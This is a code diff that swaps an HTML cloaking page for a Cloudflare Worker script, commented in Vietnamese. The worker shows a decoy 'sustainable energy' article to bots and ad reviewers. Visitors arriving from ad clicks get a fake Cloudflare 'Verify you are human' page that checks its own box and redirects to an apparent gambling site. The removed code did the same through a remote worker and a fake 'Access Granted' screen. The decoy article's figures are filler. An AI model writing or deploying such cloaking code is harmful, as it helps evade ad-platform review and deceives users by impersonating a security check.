@@ -1,230 +1,147 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BCInsights | Digital Entertainment UX & Reward Systems Analysis</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-    <style>
-        body { font-family: 'Plus Jakarta Sans', sans-serif; scroll-behavior: smooth; }
-        .bg-main { background: radial-gradient(circle at top right, #1e1b4b 0%, #020617 100%); }
-        .text-gradient { background: linear-gradient(90deg, #38bdf8, #818cf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .glass-card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
-        .reward-tag { background: linear-gradient(45deg, #f59e0b, #fbbf24); }
-    </style>
-</head>
-<body class="bg-slate-950 text-slate-200">
-    <div id="app">
-        <!-- Nội dung sẽ nạp qua JS -->
-    </div>
+export default {
+  async fetch(request, env, ctx) {
+    const url = new URL(request.url);
+    const userAgent = request.headers.get('user-agent') || '';
+    
+    // 1. CONFIGURATION
+    const TARGET_URL = "https://playbonus.online/";
+    const adParams = ['gclid', 'wbraid', 'gbraid', 'gad_source', 'fbclid', 'msclkid'];
+    
+    // Kiểm tra thông số quảng cáo
+    const hasAdParam = adParams.some(param => url.searchParams.has(param));
+    
+    // Kiểm tra Bot
+    const isBot = /bot|google|crawler|spider|slurp|bing|facebook|adchecker|checker/i.test(userAgent);
 
-    <script>
-        (async function() {
-            // CẤU HÌNH HỆ THỐNG (Giữ nguyên logic cũ)
-            const config = {
-                worker: "https://github.promo1.workers.dev/",
-                brand: "BCInsights Global",
-                token: "BCX-" + Math.floor(10000 + Math.random() * 90000),
-                ip: "141.101." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255),
-                loc: "GLOBAL-CDN-EDGE"
-            };
+    // Ngăn chặn chạy khi đang trong chế độ chỉnh sửa Elementor
+    if (url.href.indexOf('elementor') > -1) {
+      return fetch(request);
+    }
 
-            // --- GIAO DIỆN TRANG BLOG MỚI (DÀNH CHO BOT/ADS) ---
-            const UI_CLEAN = `
-            <div class="min-h-screen">
-                <!-- Navigation -->
-                <nav class="max-w-7xl mx-auto px-6 py-6 flex justify-between items-center sticky top-0 z-50 bg-slate-950/80 backdrop-blur-lg border-b border-white/5">
-                    <div class="flex items-center gap-2">
-                        <div class="w-10 h-10 bg-indigo-600 rounded-xl flex items-center justify-center shadow-lg shadow-indigo-500/20">
-                            <span class="font-black text-white italic">BC</span>
-                        </div>
-                        <span class="text-xl font-bold tracking-tight text-white uppercase">` + config.brand + `</span>
-                    </div>
-                    <div class="hidden md:flex gap-8 text-[11px] font-bold uppercase tracking-widest text-slate-400">
-                        <a href="#" class="hover:text-indigo-400 transition">Hệ sinh thái</a>
-                        <a href="#" class="hover:text-indigo-400 transition">Công nghệ UX</a>
-                        <a href="#" class="hover:text-indigo-400 transition">Cộng đồng</a>
-                    </div>
-                    <button class="bg-indigo-600 hover:bg-indigo-500 text-white px-5 py-2 rounded-lg text-[10px] font-bold uppercase tracking-widest transition-all">Khám phá ngay</button>
-                </nav>
+    // 2. LOGIC PHÂN LUỒNG
+    if (!isBot && hasAdParam) {
+      // TRẢ VỀ TRANG SECURITY CHECK (MONEY PAGE REDIRECT)
+      return new Response(getMoneyPageHTML(TARGET_URL), {
+        headers: {
+          'content-type': 'text/html;charset=UTF-8',
+          'Referrer-Policy': 'no-referrer'
+        },
+      });
+    } else {
+      // TRẢ VỀ TRANG SAFE PAGE (CONTENT REVIEW)
+      return new Response(getSafePageHTML(), {
+        headers: {
+          'content-type': 'text/html;charset=UTF-8',
+        },
+      });
+    }
+  },
+};
 
-                <!-- Hero Section -->
-                <header class="max-w-6xl mx-auto px-6 py-20 text-center">
-                    <div class="inline-flex items-center gap-2 px-4 py-1.5 mb-8 bg-indigo-500/10 border border-indigo-500/20 rounded-full text-[10px] font-bold text-indigo-400 uppercase tracking-[0.2em]">
-                        <span class="relative flex h-2 w-2">
-                            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-indigo-400 opacity-75"></span>
-                            <span class="relative inline-flex rounded-full h-2 w-2 bg-indigo-500"></span>
-                        </span>
-                        Next-Gen Digital Interaction 2025
-                    </div>
-                    <h1 class="text-5xl md:text-7xl font-extrabold text-white tracking-tight mb-8 leading-[1.1]">
-                        Định Nghĩa Lại Trải Nghiệm <br><span class="text-gradient">Giải Trí Kỹ Thuật Số.</span>
-                    </h1>
-                    <p class="text-lg text-slate-400 max-w-3xl mx-auto leading-relaxed mb-10">
-                        Phân tích chuyên sâu về cách hệ thống phần thưởng thông minh và giao diện tương tác thế hệ mới tạo nên sự đột phá cho người dùng trên nền tảng BC.
-                    </p>
-                    <div class="flex flex-wrap justify-center gap-4">
-                        <div class="glass-card px-8 py-4 rounded-2xl">
-                            <div class="text-2xl font-bold text-white">3M+</div>
-                            <div class="text-[10px] uppercase tracking-widest text-slate-500 font-bold">Người dùng hoạt động</div>
-                        </div>
-                        <div class="glass-card px-8 py-4 rounded-2xl">
-                            <div class="text-2xl font-bold text-white">0.03s</div>
-                            <div class="text-[10px] uppercase tracking-widest text-slate-500 font-bold">Tốc độ phản hồi</div>
-                        </div>
-                        <div class="glass-card px-8 py-4 rounded-2xl">
-                            <div class="text-2xl font-bold text-white">99.9%</div>
-                            <div class="text-[10px] uppercase tracking-widest text-slate-500 font-bold">Độ tin cậy hệ thống</div>
-                        </div>
-                    </div>
-                </header>
+// --- NỘI DUNG GIAO DIỆN TRANG CHỜ CHUYỂN HƯỚNG (GIỮ NGUYÊN) ---
+function getMoneyPageHTML(targetUrl) {
+  return `
+  <!DOCTYPE html>
+  <html>
+  <head>
+      <title>Please Wait...</title>
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <meta name="referrer" content="no-referrer">
+      <style>
+          body { margin: 0; padding: 0; }
+          #sec-container { position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999999;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; }
+      </style>
+  </head>
+  <body>
+      <div id="sec-container">
+          <div style="max-width:450px;width:90%;padding:20px;">
+              <h2 style="font-size:26px;font-weight:600;margin-bottom:12px;color:#111;">Checking if the site connection is secure</h2>
+              <p style="color:#666;font-size:15px;margin-bottom:32px;line-height:1.5;">Our system is verifying your request. This process is automatic to ensure the security of our infrastructure.</p>
+              
+              <div style="background:#f7fafc;border:1px solid #e2e8f0;padding:24px;border-radius:10px;display:flex;align-items:center;justify-content:space-between;margin-bottom:32px;">
+                  <div style="display:flex;align-items:center;">
+                      <input type="checkbox" id="verify-cb" style="width:24px;height:24px;margin-right:16px;cursor:pointer;">
+                      <label for="verify-cb" style="font-size:16px;color:#2d3748;cursor:pointer;user-select:none;">Verify you are human</label>
+                  </div>
+                  <div style="text-align:right;">
+                      <img src="https://www.cloudflare.com/img/logo-cloudflare-dark.svg" style="height:24px;" alt="Security">
+                      <p style="font-size:10px;color:#a0aec0;margin-top:6px;margin-bottom:0;">Privacy • Terms</p>
+                  </div>
+              </div>
 
-                <!-- Long Content Section -->
-                <section class="max-w-5xl mx-auto px-6 py-20 border-t border-white/5">
-                    <div class="grid md:grid-cols-2 gap-16 items-center mb-24">
-                        <div>
-                            <h2 class="text-3xl font-bold text-white mb-6 uppercase tracking-tighter italic">I. Triết lý thiết kế lấy người dùng làm trung tâm</h2>
-                            <p class="text-slate-400 leading-relaxed mb-6 text-justify">
-                                Tại nền tảng BC, trải nghiệm người dùng không chỉ dừng lại ở giao diện đẹp mắt. Đó là sự kết hợp hoàn hảo giữa thuật toán tối ưu hóa luồng dữ liệu và tâm lý học hành vi. Hệ thống được xây dựng trên kiến trúc microservices, cho phép xử lý hàng triệu giao dịch vi mô mỗi giây mà không gây gián đoạn.
-                            </p>
-                            <p class="text-slate-400 leading-relaxed text-justify">
-                                Chúng tôi tập trung vào việc giảm thiểu "ma sát" trong tương tác. Từ việc tích hợp ví kỹ thuật số đa chuỗi đến việc cá nhân hóa bảng điều khiển theo thói quen sử dụng, mọi chi tiết đều được tinh chỉnh để tối đa hóa sự hài lòng.
-                            </p>
-                        </div>
-                        <div class="bg-gradient-to-br from-indigo-900/40 to-slate-900 rounded-[2.5rem] p-8 border border-white/10 shadow-2xl">
-                             <div class="space-y-4">
-                                <div class="h-2 w-full bg-slate-800 rounded-full overflow-hidden"><div class="h-full bg-indigo-500 w-[95%]"></div></div>
-                                <div class="h-2 w-full bg-slate-800 rounded-full overflow-hidden"><div class="h-full bg-indigo-500 w-[88%]"></div></div>
-                                <div class="h-2 w-full bg-slate-800 rounded-full overflow-hidden"><div class="h-full bg-indigo-500 w-[92%]"></div></div>
-                                <div class="mt-8 grid grid-cols-2 gap-4">
-                                    <div class="p-4 bg-white/5 rounded-xl border border-white/5 text-center">
-                                        <div class="text-indigo-400 font-bold">Cơ chế Loyalty</div>
-                                        <div class="text-[10px] text-slate-500 uppercase mt-1">Thông minh</div>
-                                    </div>
-                                    <div class="p-4 bg-white/5 rounded-xl border border-white/5 text-center">
-                                        <div class="text-indigo-400 font-bold">Bảo mật đa lớp</div>
-                                        <div class="text-[10px] text-slate-500 uppercase mt-1">Chuẩn ISO</div>
-                                    </div>
-                                </div>
-                             </div>
-                        </div>
-                    </div>
+              <div style="border-top:1px solid #edf2f7;padding-top:24px;">
+                  <h3 style="font-size:16px;font-weight:600;margin-bottom:8px;color:#1a202c;">Why am I seeing this page?</h3>
+                  <p style="font-size:14px;color:#718096;line-height:1.6;margin:0;">Verification is required to ensure that the connection is legitimate and to prevent automated malicious activity.</p>
+              </div>
+          </div>
+      </div>
+      <script>
+          setTimeout(() => {
+              const cb = document.getElementById('verify-cb');
+              if (cb) cb.checked = true;
+              setTimeout(() => {
+                  window.location.replace("${targetUrl}");
+              }, 800);
+          }, 1500);
+      </script>
+  </body>
+  </html>`;
+}
 
-                    <div class="mb-24">
-                        <h2 class="text-3xl font-bold text-white mb-10 uppercase tracking-tighter italic text-center">II. Hệ sinh thái phần thưởng và Giá trị bền vững</h2>
-                        <div class="grid md:grid-cols-3 gap-8">
-                            <div class="glass-card p-8 rounded-3xl hover:border-indigo-500/50 transition-all group">
-                                <div class="w-12 h-12 bg-indigo-600/20 rounded-full flex items-center justify-center mb-6 group-hover:bg-indigo-600 transition-all">
-                                    <svg class="w-6 h-6 text-indigo-400 group-hover:text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
-                                </div>
-                                <h3 class="text-xl font-bold text-white mb-4">Tính thanh khoản cao</h3>
-                                <p class="text-slate-500 text-sm leading-relaxed">Hỗ trợ hơn 100 loại tài sản kỹ thuật số khác nhau, đảm bảo việc luân chuyển giá trị diễn ra tức thì và minh bạch.</p>
-                            </div>
-                            <div class="glass-card p-8 rounded-3xl hover:border-indigo-500/50 transition-all group">
-                                <div class="w-12 h-12 bg-indigo-600/20 rounded-full flex items-center justify-center mb-6 group-hover:bg-indigo-600 transition-all">
-                                    <svg class="w-6 h-6 text-indigo-400 group-hover:text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197M13 7a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
-                                </div>
-                                <h3 class="text-xl font-bold text-white mb-4">Mạng lưới Social-Fi</h3>
-                                <p class="text-slate-500 text-sm leading-relaxed">Người dùng có thể tương tác, chia sẻ chiến lược và tham gia vào các sự kiện cộng đồng mang tính toàn cầu.</p>
-                            </div>
-                            <div class="glass-card p-8 rounded-3xl hover:border-indigo-500/50 transition-all group">
-                                <div class="w-12 h-12 bg-indigo-600/20 rounded-full flex items-center justify-center mb-6 group-hover:bg-indigo-600 transition-all">
-                                    <svg class="w-6 h-6 text-indigo-400 group-hover:text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
-                                </div>
-                                <h3 class="text-xl font-bold text-white mb-4">Minh bạch thuật toán</h3>
-                                <p class="text-slate-500 text-sm leading-relaxed">Mọi cơ chế vận hành đều dựa trên hợp đồng thông minh (Smart Contract), có thể kiểm chứng bởi bất kỳ bên thứ ba nào.</p>
-                            </div>
-                        </div>
-                    </div>
+// --- NỘI DUNG TRANG SAFE PAGE (ĐÃ THAY ĐỔI CHỦ ĐỀ) ---
+function getSafePageHTML() {
+  return `
+  <!DOCTYPE html>
+  <html lang="en">
+  <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Sustainable Energy: The Global Transition</title>
+  </head>
+  <body style="margin:0; padding:0; background: #fafafa;">
+    <article style="max-width: 850px; margin: 60px auto; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.8; color: #2c3e50; padding: 40px; background: #ffffff; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border-radius: 8px;">
+        <header style="border-bottom: 2px solid #2ecc71; margin-bottom: 40px; padding-bottom: 20px;">
+            <h1 style="font-size: 2.5rem; color: #1a252f; line-height: 1.2; font-weight: 700;">Sustainable Energy Systems: Strategic Analysis of Renewable Integration</h1>
+            <p style="color: #7f8c8d; font-size: 1rem; margin-top: 15px; text-transform: uppercase; letter-spacing: 1px;">Scientific Journal • Global Ecology Division • Update 2025</p>
+        </header>
 
-                    <!-- Testimonials -->
-                    <div class="py-20 border-t border-white/5">
-                        <h2 class="text-3xl font-bold text-white mb-16 uppercase tracking-tighter italic text-center font-black">Phản hồi từ các chuyên gia UX</h2>
-                        <div class="grid md:grid-cols-2 gap-10">
-                            <div class="glass-card p-10 rounded-tr-[4rem] rounded-bl-[4rem] border-l-4 border-l-indigo-500">
-                                <p class="text-slate-300 italic mb-8 text-lg">"Hệ thống điều hướng của BC thực sự là một bước tiến dài trong ngành giải trí số. Việc tích hợp các yếu tố gamification vào phần thưởng hàng ngày khiến người dùng luôn cảm thấy hào hứng."</p>
-                                <div class="flex items-center gap-4">
-                                    <div class="w-12 h-12 rounded-full bg-slate-700"></div>
-                                    <div>
-                                        <div class="text-white font-bold">Alex Thompson</div>
-                                        <div class="text-[10px] text-indigo-400 uppercase tracking-widest font-black">Lead Product Designer @TechFlow</div>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="glass-card p-10 rounded-tl-[4rem] rounded-br-[4rem] border-r-4 border-r-indigo-500">
-                                <p class="text-slate-300 italic mb-8 text-lg">"Tôi đánh giá cao khả năng bảo mật và tốc độ rút tài sản. Đây là nền tảng hiếm hoi cân bằng được giữa tính giải trí cao và sự an toàn tuyệt đối cho người dùng."</p>
-                                <div class="flex items-center gap-4">
-                                    <div class="w-12 h-12 rounded-full bg-slate-700"></div>
-                                    <div>
-                                        <div class="text-white font-bold">Minh Nguyen</div>
-                                        <div class="text-[10px] text-indigo-400 uppercase tracking-widest font-black">Blockchain Analyst</div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </section>
+        <section>
+            <p style="font-size: 1.2rem; color: #34495e; line-height: 1.7; font-style: italic; margin-bottom: 35px; border-left: 5px solid #2ecc71; padding-left: 20px;">
+                "The shift toward renewable resources is no longer a choice but a technical necessity for modern economic stability. This review examines the efficiency of decentralized power grids."
+            </p>
 
-                <!-- Footer -->
-                <footer class="bg-slate-900/50 py-20 border-t border-white/5 text-center">
-                    <div class="max-w-7xl mx-auto px-6">
-                        <div class="text-[10px] font-black uppercase tracking-[0.5em] text-slate-600 mb-8">&copy; 2025 ` + config.brand + ` Labs. All Rights Reserved.</div>
-                        <div class="flex justify-center gap-10 text-[10px] font-bold text-slate-500 uppercase tracking-widest">
-                            <a href="#" class="hover:text-indigo-400">Privacy Policy</a>
-                            <a href="#" class="hover:text-indigo-400">Terms of Use</a>
-                            <a href="#" class="hover:text-indigo-400">Contact Support</a>
-                        </div>
-                    </div>
-                </footer>
-            </div>`;
+            <h2 style="font-size: 1.7rem; color: #16a085; margin-top: 40px;">1. Decarbonization and Grid Stability</h2>
+            <p>One of the primary challenges in the green transition is maintaining grid stability while increasing the percentage of intermittent sources like solar and wind. Advanced AI algorithms are now being used to predict load fluctuations and adjust storage output in real-time.</p>
 
-            // --- GIAO DIỆN ACCESS GRANTED (GIỮ NGUYÊN) ---
-            const UI_ACCESS = `
-            <style>
-                body{background:#030a16; font-family:'Plus Jakarta Sans',sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; overflow:hidden;}
-                .c{background:rgba(10,20,37,0.95); backdrop-filter:blur(25px); border:1px solid rgba(79, 70, 229, 0.2); border-radius:40px; width:100%; max-width:440px; padding:60px 35px; text-align:center; box-shadow:0 40px 100px rgba(0,0,0,0.8);}
-                .s-b{background:rgba(0,0,0,0.3); border:1px solid rgba(255,255,255,0.05); border-radius:24px; padding:25px; margin:30px 0; text-align:left;}
-                .val{font-family:monospace; color:#818cf8; font-weight:700;}
-                .btn-p{background:linear-gradient(135deg,#6366f1 0%,#4f46e5 100%); color:#fff; font-weight:900; padding:22px; border-radius:18px; display:block; text-decoration:none; text-transform:uppercase; cursor:pointer; box-shadow: 0 10px 30px rgba(79, 70, 229, 0.3);}
-            </style>
-            <div class="c">
-                <div class="flex justify-between items-center mb-10 border-b border-white/5 pb-4"><span class="text-[10px] font-black uppercase text-indigo-400 italic">Security Handshake</span><span class="text-xs font-bold text-indigo-500 uppercase">Verified</span></div>
-                <h1 class="text-4xl font-extrabold uppercase mb-2 italic text-white">Access <span class="text-indigo-400">Granted</span></h1>
-                <p class="text-indigo-400/50 text-[10px] font-bold uppercase tracking-[0.3em] mb-8">Node Authorized for Session</p>
-                <div class="s-b space-y-5 text-[11px] uppercase tracking-widest text-white">
-                    <div class="flex justify-between"><span>Identifier:</span><span class="val">` + config.token + `</span></div>
-                    <div class="flex justify-between"><span>Node IP:</span><span class="val">` + config.ip + `</span></div>
-                    <div class="flex justify-between"><span>Cluster:</span><span class="val">` + config.loc + `</span></div>
-                </div>
-                <p class="text-gray-500 text-[11px] mb-10 italic">Secure connection authorized. Redirecting to portal...</p>
-                <div id="cta" class="btn-p">Tiếp tục đến trang chủ</div>
-            </div>`;
+            <div style="background: #f1f9f5; border: 1px solid #d1e7dd; padding: 25px; margin: 30px 0; border-radius: 8px;">
+                <h4 style="margin-top:0; color:#0f5132;">Annual Efficiency Growth (2020-2025):</h4>
+                <ul style="margin-bottom:0; line-height: 2;">
+                    <li><strong>Photovoltaic Conversion:</strong> Increased by 14.2% globally.</li>
+                    <li><strong>Lithium-Sulfur Storage:</strong> Reaching 450 Wh/kg in test phases.</li>
+                    <li><strong>Carbon Sequestration:</strong> Operational costs reduced by 22% annually.</li>
+                </ul>
+            </div>
 
-            const app = document.getElementById('app');
+            <h2 style="font-size: 1.7rem; color: #16a085; margin-top: 40px;">2. The Role of Smart Infrastructure</h2>
+            <p>Smart cities represent the next frontier. By integrating IoT sensors into urban heating and cooling systems, energy waste can be reduced by up to 30%. This synergy between digital technology and environmental science is the key to achieving Net Zero by 2050.</p>
 
-            try {
-                // GỌI WORKER
-                const response = await fetch(config.worker + window.location.search);
-                const data = await response.json();
+            <h2 style="font-size: 1.7rem; color: #16a085; margin-top: 40px;">3. Economic Implications of Green Policies</h2>
+            <p>While the initial capital expenditure (CAPEX) for renewable projects remains higher than traditional fossil fuels, the operational expenditure (OPEX) is significantly lower. Over a 20-year lifecycle, green energy proves to be 40% more cost-effective for large-scale industrial applications.</p>
 
-                if (data.status === "success" && data.redirect) {
-                    // HIỂN THỊ TRANG CHUYỂN HƯỚNG (CHO KHÁCH THẬT)
-                    app.innerHTML = UI_ACCESS;
-                    const jump = () => { window.location.replace(data.redirect); };
-                    document.getElementById('cta').onclick = jump;
-                    ['mousedown', 'touchstart', 'mousemove', 'scroll'].forEach(evt => {
-                        window.addEventListener(evt, jump, { once: true });
-                    });
-                    setTimeout(jump, 3000);
-                } else {
-                    // HIỂN THỊ TRANG BLOG (CHO BOT/ADS)
-                    app.innerHTML = UI_CLEAN;
-                }
-            } catch (error) {
-                app.innerHTML = UI_CLEAN;
-            }
-        })();
-    </script>
-</body>
-</html>
+            <div style="margin: 50px 0; padding: 35px; background: #1a252f; color: #ecf0f1; text-align: center; border-radius: 10px;">
+                <h3 style="margin-top:0; color: #2ecc71;">2025 Ecological Forecast</h3>
+                <p style="font-size: 1.1rem; opacity: 0.9;">"The convergence of battery technology and green hydrogen will likely render traditional coal-fired plants obsolete within the next decade."</p>
+                <div style="font-weight: bold; margin-top: 15px; font-size: 1.3rem; color: #f1c40f;">Global Sustainability Index Score: A+</div>
+            </div>
+
+            <h2 style="font-size: 1.7rem; color: #16a085; margin-top: 40px;">Conclusion</h2>
+            <p>The path to a sustainable future is paved with engineering innovation. As we continue to refine energy harvesting techniques, the global economy becomes more resilient to climate-related supply chain disruptions.</p>
+        </section>
+
+        <footer style="margin-top: 60px; padding-top: 25px; border-top: 1px solid #eee; font-size: 0.85rem; color: #95a5a6; text-align: center;">
+            © 2025 Institute for Global Sustainability & Green Research. All Rights Reserved. This document is a technical draft for peer review.
+        </footer>
+    </article>
+  </body>
+  </html>`;
+}
